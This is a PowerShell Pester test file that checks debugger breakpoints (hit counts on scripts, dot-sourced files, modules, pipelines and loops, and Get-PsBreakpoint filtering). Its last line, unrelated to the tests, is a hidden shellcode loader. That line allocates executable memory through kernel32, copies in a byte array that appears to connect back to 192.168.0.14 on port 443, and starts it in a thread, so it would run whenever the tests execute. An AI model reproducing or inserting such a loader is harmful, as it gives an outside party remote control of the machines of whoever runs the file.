


Describe "Breakpoints set on custom FileSystem provider files should work" -Tags "CI" {
    
    
    
    
    
    
    
    
    
    
    
    try
    {
        
        
        
        $scriptPath = [io.path]::GetTempPath()
        $scriptName = "DebuggerScriptTests-ExposeBug221362.ps1"
        $scriptFullName = [io.path]::Combine($scriptPath, $scriptName)

        write-output '"hello"' > $scriptFullName

        
        
        
        new-psdrive -name tmpTestA1 -psprovider FileSystem -root $scriptPath > $null

        
        
        
        Push-Location tmpTestA1:\
        $breakpoint = set-psbreakpoint .\$scriptName 1 -action { continue }
        & .\$scriptName

	    It "Breakpoint hit count" {
		    $breakpoint.HitCount | Should -Be 1
	    }
    }
    finally
    {
        Pop-Location

        if ($null -ne $breakpoint) { $breakpoint | remove-psbreakpoint }
        if (Test-Path $scriptFullName) { Remove-Item $scriptFullName -Force }
        if ($null -ne (Get-PSDrive -Name tmpTestA1 2> $null)) { Remove-PSDrive -Name tmpTestA1 -Force }
    }
}

Describe "Tests line breakpoints on dot-sourced files" -Tags "CI" {
    
    
    
    
    

    try
    {
        
        
        
        $scriptFile = [io.path]::Combine([io.path]::GetTempPath(), "DebuggerScriptTests-ExposeBug245331.ps1")

        write-output '
        function fibonacci
        {
            param($number)

            if ($number -eq 0) {
                return 0
            }

            if ($number -eq 1) {
                return 1
            }

            $f1 = fibonacci($number - 1)
            $f2 = fibonacci($number - 2)

            $f1 + $f2 
        }

        fibonacci(3)
        ' > $scriptFile

        
        
        
        $breakpoint = Set-PsBreakpoint $scriptFile 17 -action { continue; }

        & $scriptFile

	    It "Breakpoint on recursive function hit count" {
		    $breakpoint.HitCount | Should -BeGreaterThan 0
	    }
    }
    finally
    {
        if ($null -ne $breakpoint) { $breakpoint | remove-psbreakpoint }
        if (Test-Path $scriptFile) { Remove-Item -Path $scriptFile -Force }
    }
}

Describe "Function calls clear debugger cache too early" -Tags "CI" {
    
    
    
    
    
    
    
    
    
    
    
    try
    {
        
        
        
        $scriptFile = [io.path]::Combine([io.path]::GetTempPath(), "DebuggerScriptTests-ExposeBug248703.ps1")

        write-output '
        function Hello
        {
            write-output "hello"
        }

        write-output "begin"  
        Hello
        write-output "end"    
        ' > $scriptFile

        
        
        
        $breakpoint1 = Set-PsBreakpoint $scriptFile 7 -action { continue; }
        $breakpoint2 = Set-PsBreakpoint $scriptFile 9 -action { continue; }

        & $scriptFile

	    It "Breakpoint before function call count" {
		    $breakpoint1.HitCount | Should -Be 1
	    }

	    It "Breakpoint after function call count" {
		    $breakpoint2.HitCount | Should -Be 1
	    }
    }
    finally
    {
        if ($null -ne $breakpoint1) { $breakpoint1 | remove-psbreakpoint }
        if ($null -ne $breakpoint2) { $breakpoint2 | remove-psbreakpoint }
        if (Test-Path $scriptFile) { Remove-Item $scriptFile -Force }
    }
}

Describe "Line breakpoints on commands in multi-line pipelines" -Tags "CI" {
    
    
    
    
    
    
    
    
    
    

    $script = Join-Path ${TestDrive} ExposeBug588887.DRT.tmp.ps1

    try
    {
        Set-Content $script @'
        1..3 |
        ForEach-Object { $_ } | sort-object |
        get-unique
'@

        $breakpoints = Set-PsBreakpoint $script 1,2,3 -action { continue }

        $null = & $script

	    It "Breakpoint on line 1 hit count" {
		    $breakpoints[0].HitCount | Should -Be 1
	    }

	    It "Breakpoint on line 2 hit count" {
		    $breakpoints[1].HitCount | Should -Be 3
	    }

	    It "Breakpoint on line 3 hit count" {
		    $breakpoints[2].HitCount | Should -Be 1
	    }
    }
    finally
    {
        if ($null -ne $breakpoints) { $breakpoints | remove-psbreakpoint }
        if (Test-Path $script)
        {
            Remove-Item $script -Force
        }
    }

    Context "COM TESTS" {
        
        BeforeAll {
            if ( $IsCoreCLR ) { return } 
            $scriptPath1 = Join-Path $TestDrive SBPShortPathBug133807.DRT.tmp.ps1
            $scriptPath1 = setup -f SBPShortPathBug133807.DRT.tmp.ps1 -content '
            1..3 |
            ForEach-Object { $_ } | sort-object |
            get-unique'
            $a = New-Object -ComObject Scripting.FileSystemObject
            $f = $a.GetFile($scriptPath1)
            $scriptPath2 = $f.ShortPath

            $breakpoints = Set-PsBreakpoint $scriptPath2 1,2,3 -action { continue }
            $null = & $scriptPath2
        }

        AfterAll {
            if ( $IsCoreCLR ) { return }
            if ($null -ne $breakpoints) { $breakpoints | Remove-PSBreakpoint }
        }

        It "Short path Breakpoint on line 1 hit count" -skip:$IsCoreCLR {
            $breakpoints[0].HitCount | Should -Be 1
        }

        It "Short path Breakpoint on line 2 hit count" -skip:$IsCoreCLR {
            $breakpoints[1].HitCount | Should -Be 3
        }

        It "Short path Breakpoint on line 3 hit count" -skip:$IsCoreCLR {
            $breakpoints[2].HitCount | Should -Be 1
        }
    }
}

Describe "Unit tests for various script breakpoints" -Tags "CI" {
    
    
    
    
    
    param($path = $null)

    if ($null -eq $path)
    {
        $path = split-path $MyInvocation.InvocationName
    }

    
    
    
    function Verify([ScriptBlock] $command, [System.Management.Automation.Breakpoint[]] $expected)
    {
        $actual = @(& $command)

	    It "Script breakpoint count '${command}'|${expected}" {
		    $actual.Count | Should -Be $expected.Count
	    }

        foreach ($breakpoint in $actual)
        {
	        It "Expected script breakpoints '${command}|${breakpoint}'" {
		        ($expected -contains $breakpoint) | Should -BeTrue
	        }
        }
    }

    
    
    
    function VerifyException([ScriptBlock] $command, [string] $exception)
    {
        $e = { & $command } | Should -Throw -PassThru
        $e.Exception.GetType().Name | Should -Be $exception
    }

    
    
    
    try
    {
        
        
        
        Get-PsBreakpoint | Remove-PsBreakpoint

        
        
        
        $scriptFile1 = [io.path]::Combine([io.path]::GetTempPath(), "DebuggerScriptTests-Get-PsBreakpoint1.ps1")
        $scriptFile2 = [io.path]::Combine([io.path]::GetTempPath(), "DebuggerScriptTests-Get-PsBreakpoint2.ps1")

        write-output '' > $scriptFile1
        write-output '' > $scriptFile2

        
        
        
        $line1 = Set-PsBreakpoint $scriptFile1 1
        $line2 = Set-PsBreakpoint $scriptFile2 2

        $cmd1 = Set-PsBreakpoint -c command1 -s $scriptFile1
        $cmd2 = Set-PsBreakpoint -c command2 -s $scriptFile2
        $cmd3 = Set-PsBreakpoint -c command3

        $var1 = Set-PsBreakpoint -v variable1 -s $scriptFile1
        $var2 = Set-PsBreakpoint -v variable2 -s $scriptFile2
        $var3 = Set-PsBreakpoint -v variable3

        
        
        
        Verify { get-psbreakpoint } $line1,$line2,$cmd1,$cmd2,$cmd3,$var1,$var2,$var3

        
        
        
        Verify { get-psbreakpoint -id $line1.ID,$cmd1.ID,$var1.ID } $line1,$cmd1,$var1 
        Verify { get-psbreakpoint $line2.ID,$cmd2.ID,$var2.ID }     $line2,$cmd2,$var2 
        Verify { $cmd3.ID,$var3.ID | get-psbreakpoint }             $cmd3,$var3        

        VerifyException { get-psbreakpoint -id $null } "ParameterBindingValidationException"
        VerifyException { get-psbreakpoint -id $line1.ID -script $scriptFile1 } "ParameterBindingException"

        
        
        
        Verify { get-psbreakpoint -script $scriptFile1 } $line1,$cmd1,$var1 
        Verify { get-psbreakpoint $scriptFile2 }         $line2,$cmd2,$var2 
        Verify { $scriptFile2 | get-psbreakpoint }       $line2,$cmd2,$var2 

        VerifyException { get-psbreakpoint -script $null } "ParameterBindingValidationException"
        VerifyException { get-psbreakpoint -script $scriptFile1,$null } "ParameterBindingValidationException"

        
        $directoryName = [System.IO.Path]::GetDirectoryName($scriptFile1)
        $fileName = [System.IO.Path]::GetFileName($scriptFile1)

        Push-Location $directoryName
        Verify { get-psbreakpoint -script $fileName } $line1,$cmd1,$var1
        Pop-Location

        
        
        
        $commandType = [Microsoft.PowerShell.Commands.BreakpointType]"command"
        $variableType = [Microsoft.PowerShell.Commands.BreakpointType]"variable"

        Verify { get-psbreakpoint -type "line" }                      $line1,$line2     
        Verify { get-psbreakpoint $commandType }                      $cmd1,$cmd2,$cmd3 
        Verify { $variableType | get-psbreakpoint }                   $var1,$var2,$var3 
        Verify { get-psbreakpoint -type "line" -script $scriptFile1 } @($line1)         

        VerifyException { get-psbreakpoint -type $null } "ParameterBindingValidationException"

        
        
        
        Verify { get-psbreakpoint -command "command1","command2" }                       $cmd1,$cmd2 
        Verify { get-psbreakpoint -command "command1","command2" -script $scriptFile1 }  @($cmd1)    

        VerifyException { get-psbreakpoint -command $null } "ParameterBindingValidationException"

        
        
        
        Verify { get-psbreakpoint -variable "variable1","variable2" }                       $var1,$var2 
        Verify { get-psbreakpoint -variable "variable1","variable2" -script $scriptFile1 }  @($var1)    

        VerifyException { get-psbreakpoint -variable $null } "ParameterBindingValidationException"
    }
    finally
    {
        if ($null -ne $line1) { $line1 | Remove-PSBreakpoint }
        if ($null -ne $line2) { $line2 | Remove-PSBreakpoint }
        if ($null -ne $cmd1) { $cmd1 | Remove-PSBreakpoint }
        if ($null -ne $cmd2) { $cmd2 | Remove-PSBreakpoint }
        if ($null -ne $cmd3) { $cmd3 | Remove-PSBreakpoint }
        if ($null -ne $var1) { $var1 | Remove-PSBreakpoint }
        if ($null -ne $var2) { $var2 | Remove-PSBreakpoint }
        if ($null -ne $var3) { $var3 | Remove-PSBreakpoint }

        if (Test-Path $scriptFile1) { Remove-Item $scriptFile1 -Force }
        if (Test-Path $scriptFile2) { Remove-Item $scriptFile2 -Force }
    }
}

Describe "Unit tests for line breakpoints on dot-sourced files" -Tags "CI" {
    
    
    
    
    
    
    param($path = $null)

    if ($null -eq $path)
    {
        $path = split-path $MyInvocation.InvocationName
    }

    try
    {
        
        
        
        $scriptFile = [io.path]::Combine([io.path]::GetTempPath(), "DebuggerScriptTests-InMemoryBreakpoints.ps1")

        write-output '
        function Function1
        {
            write-host "In Function1" 
        }

        function Function2
        {
            write-host "In Function2" 
        }

        function Get-TestCmdlet
        {
            [CmdletBinding()]
            param()

            begin
            {
                write-host "In Get-TestCmdlet (begin)"
            }

            process
            {
                write-host "In Get-TestCmdlet (process)" 
            }

            end
            {
                write-host "In Get-TestCmdlet (end)"
            }
        }
        ' > $scriptFile

        
        
        
        $breakpoint1 = Set-PsBreakpoint $scriptFile 4 -action { continue; }
        $breakpoint2 = Set-PsBreakpoint $scriptFile 9 -action { continue; }
        $breakpoint3 = Set-PsBreakpoint $scriptFile 24 -action { continue; }

        . $scriptFile

        Function1
        Get-TestCmdlet

	    It "Breakpoint on function hit count" {
		    $breakpoint1.HitCount | Should -Be 1
	    }

	    It "Breakpoint on uncalled function hit count" {
		    $breakpoint2.HitCount | Should -Be 0
	    }

	    It "Breakpoint on cmdlet hit count" {
		    $breakpoint3.HitCount | Should -Be 1
	    }
    }
    finally
    {
        if ($null -ne $breakpoint1) { $breakpoint1 | Remove-PSBreakpoint }
        if ($null -ne $breakpoint2) { $breakpoint2 | Remove-PSBreakpoint }
        if ($null -ne $breakpoint3) { $breakpoint3 | Remove-PSBreakpoint }
        if (Test-Path $scriptFile) { Remove-Item $scriptFile -Force }
    }
}

Describe "Unit tests for line breakpoints on modules" -Tags "CI" {
    
    
    
    
    
    
    $oldModulePath = $env:PSModulePath
    try
    {
        
        
        
        $moduleName = "ModuleBreakpoints"
        $moduleRoot = [io.path]::GetTempPath();
        $moduleDirectory = [io.path]::Combine($moduleRoot, $moduleName)
        $moduleFile = [io.path]::Combine($moduleDirectory, $moduleName + ".psm1")

        New-Item -ItemType Directory $moduleDirectory 2> $null

        write-output '
        function ModuleFunction1
        {
            write-output "In ModuleFunction1" 
        }

        function ModuleFunction2
        {
            write-output "In ModuleFunction2" 
        }

        function Get-ModuleCmdlet
        {
            [CmdletBinding()]
            param()

            begin
            {
                write-output "In Get-ModuleCmdlet (begin)"
            }

            process
            {
                write-output "In Get-ModuleCmdlet (process)" 
            }

            end
            {
                write-output "In Get-ModuleCmdlet (end)"
            }
        }

        export-modulemember ModuleFunction1
        export-modulemember ModuleFunction2
        export-modulemember Get-ModuleCmdlet
        ' > $moduleFile

        
        
        
        $ENV:PSModulePath = $moduleRoot

        import-module $moduleName

        
        
        
        $breakpoint1 = Set-PsBreakpoint $moduleFile 4 -action { continue }
        $breakpoint2 = Set-PsBreakpoint $moduleFile 9 -action { continue }
        $breakpoint3 = Set-PsBreakpoint $moduleFile 24 -Action { continue }
        $breakpoint4 = Set-PsBreakpoint $moduleFile 25 -Action { continue }

        ModuleFunction1

        Get-ModuleCmdlet

	    It "Breakpoint1 on module function hit count" {
		    $breakpoint1.HitCount | Should -Be 1
	    }

	    It "Breakpoint2 on uncalled module function hit count" {
		    $breakpoint2.HitCount | Should -Be 0
	    }

	    It "Breakpoint3 on module cmdlet hit count" {
		    $breakpoint3.HitCount | Should -Be 1
	    }

	    It "Breakpoint4 on module cmdlet hit count" {
		    $breakpoint4.HitCount | Should -Be 1
	    }
    }
    finally
    {
        $env:PSModulePath = $oldModulePath
        if ($null -ne $breakpoint1) { Remove-PSBreakpoint $breakpoint1 }
        if ($null -ne $breakpoint2) { Remove-PSBreakpoint $breakpoint2 }
        if ($null -ne $breakpoint3) { Remove-PSBreakpoint $breakpoint3 }
        if ($null -ne $breakpoint4) { Remove-PSBreakpoint $breakpoint4 }
        get-module $moduleName | remove-module
        if (Test-Path $moduleDirectory) { Remove-Item $moduleDirectory -Recurse -force -ErrorAction silentlycontinue }
    }
}

Describe "Sometimes line breakpoints are ignored" -Tags "CI" {
    
    
    
    
    
    
    
    
    
    
    

    $path = [io.path]::GetTempPath();
    $tempFileName1 = Join-Path -Path $path -ChildPath "TDBG47488F.ps1"
    $tempFileName2 = Join-Path -Path $path -ChildPath "TDBG88473F.ps1"

    try
    {
        @'
        while ($count -lt 5)
        {
            $count += 1
            "Hello $count"
        }
'@ > $tempFileName1

        @'
        do
        {
            $count2 += 1
            "Hello do $count2"
        }
        while ($count2 -lt 5)
'@ > $tempFileName2

        $bp1 = Set-PSBreakpoint -Script $tempFileName1 -Line 3 -Action {continue}
        & $tempFileName1

	    It "Breakpoint 1 hit count" {
		    $bp1.HitCount | Should -Be 6
	    }

        $bp2 = Set-PSBreakpoint -Script $tempFileName2 -Line 3 -Action {continue}
        & $tempFileName2

	    It "Breakpoint 2 hit count" {
		    $bp2.HitCount | Should -Be 6
	    }
    }
    finally
    {
        if ($null -ne $bp1) { Remove-PSBreakpoint $bp1 }
        if ($null -ne $bp2) { Remove-PSBreakpoint $bp2 }

        if (Test-Path -Path $tempFileName1) { Remove-Item $tempFileName1 -force }
        if (Test-Path -Path $tempFileName2) { Remove-Item $tempFileName2 -force }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x0e,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

